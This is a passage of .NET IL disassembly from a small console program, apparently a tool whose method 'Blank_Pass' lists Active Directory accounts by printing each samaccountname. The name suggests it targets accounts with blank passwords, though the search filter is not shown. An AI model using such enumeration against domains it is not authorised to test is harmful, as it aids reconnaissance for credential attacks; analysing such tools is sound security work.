    IL_0049:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.SearchResult [System.DirectoryServices]System.DirectoryServices.SearchResultCollection::get_Item(int32)
    IL_004e:  stloc.3
    IL_004f:  ldloc.3
    IL_0050:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection [System.DirectoryServices]System.DirectoryServices.SearchResult::get_Properties()
    IL_0055:  ldstr      "samaccountname"
    IL_005a:  callvirt   instance bool [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection::Contains(string)
    IL_005f:  stloc.s    V_7
    IL_0061:  ldloc.s    V_7
    IL_0063:  brfalse.s  IL_0088

    IL_0065:  nop
    IL_0066:  ldloc.3
    IL_0067:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection [System.DirectoryServices]System.DirectoryServices.SearchResult::get_Properties()
    IL_006c:  ldstr      "samaccountname"
    IL_0071:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ResultPropertyValueCollection [System.DirectoryServices]System.DirectoryServices.ResultPropertyCollection::get_Item(string)
    IL_0076:  ldc.i4.0
    IL_0077:  callvirt   instance object [System.DirectoryServices]System.DirectoryServices.ResultPropertyValueCollection::get_Item(int32)
    IL_007c:  castclass  [mscorlib]System.String
    IL_0081:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0086:  nop
    IL_0087:  nop
    IL_0088:  nop
    IL_0089:  ldloc.s    V_6
    IL_008b:  ldc.i4.1
    IL_008c:  add
    IL_008d:  stloc.s    V_6
    IL_008f:  ldloc.s    V_6
    IL_0091:  ldloc.s    V_4
    IL_0093:  callvirt   instance int32 [System.DirectoryServices]System.DirectoryServices.SearchResultCollection::get_Count()
    IL_0098:  clt
    IL_009a:  stloc.s    V_8
    IL_009c:  ldloc.s    V_8
    IL_009e:  brtrue.s   IL_0044

    IL_00a0:  nop
    IL_00a1:  ret
  } // end of method Program::Blank_Pass

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ret
  } // end of method Program::.ctor

} // end of class ConsoleApp3.Program


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file c:\users\public\Rt.res
